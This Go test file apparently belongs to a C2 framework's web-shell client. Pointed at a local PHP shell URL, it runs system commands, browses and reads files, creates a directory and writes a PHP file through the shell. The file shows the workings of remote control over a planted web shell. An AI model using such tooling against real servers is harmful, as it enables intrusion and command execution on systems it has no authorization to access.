package webshell

import (
	"caffeine/client/c2"
	"caffeine/core"
	"fmt"
	"gopkg.in/yaml.v3"
	"io/ioutil"
	"testing"
)

func TestHello(t *testing.T) {
	data, err := ioutil.ReadFile("../../c2.yaml")
	if err != nil {
		fmt.Errorf("无法读取文件: %v", err)
	}

	var conf c2.C2Yaml
	err = yaml.Unmarshal(data, &conf)
	if err != nil {
		fmt.Errorf("无法解析 YAML 文件: %v", err)
	}

	target := core.Target{ShellURL: "http://127.0.0.1/shell/server.php"}
	client := NewWebClient(target, conf)

	client.GetSystemInfo()
	res := client.RunCMD(".", "dir")
	fmt.Println(res)
	client.LoadDir(".")
	session := client.GetSession()
	fmt.Println(session)
}

func TestFile(t *testing.T) {
	data, err := ioutil.ReadFile("../../c2.yaml")
	if err != nil {
		fmt.Errorf("无法读取文件: %v", err)
	}

	var conf c2.C2Yaml
	err = yaml.Unmarshal(data, &conf)
	if err != nil {
		fmt.Errorf("无法解析 YAML 文件: %v", err)
	}

	target := core.Target{ShellURL: "http://127.0.0.1/shell/server.php"}
	client := NewWebClient(target, conf)

	client.GetSystemInfo()

	client.LoadDir(".")
	file := client.session.FileSystem.GetFile("1.php")
	readFile := client.ReadFile(file)
	fmt.Println(readFile)
	client.MakeDir(client.session.FileSystem.Current, "test")

	makeFile := client.MakeFile(client.session.FileSystem.Current, "333.php")
	if makeFile != nil {
		client.WriteFile(makeFile, "<?php @phpinfo();?>")
	}

}
